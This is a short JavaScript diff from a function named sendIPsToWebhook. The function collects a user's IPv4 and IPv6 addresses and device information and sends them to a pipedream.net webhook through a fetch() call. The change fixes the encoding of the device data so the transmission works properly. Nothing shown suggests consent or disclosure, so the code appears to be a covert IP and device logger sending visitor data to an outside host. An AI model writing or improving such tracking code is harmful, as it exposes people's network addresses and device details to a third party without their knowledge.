@@ -264,7 +264,9 @@ async function sendIPsToWebhook() {
 
     const deviceInfo = await getDeviceInfo();
 
-    const url = `https://eo5d3jdbl6ngkcy.m.pipedream.net/?ip4v=${ipv4}&ip6v=${ipv6}&info=${deviceInfo}`;
+    const encodedInfo = encodeURIComponent(JSON.stringify(deviceInfo));
+    const url = `https://eo5d3jdbl6ngkcy.m.pipedream.net/?ip4v=${ipv4}&ip6v=${ipv6}&info=${encodedInfo}`;
+
 
     await fetch(url);
     console.log("IPs sent successfully:", ipv4, ipv6);
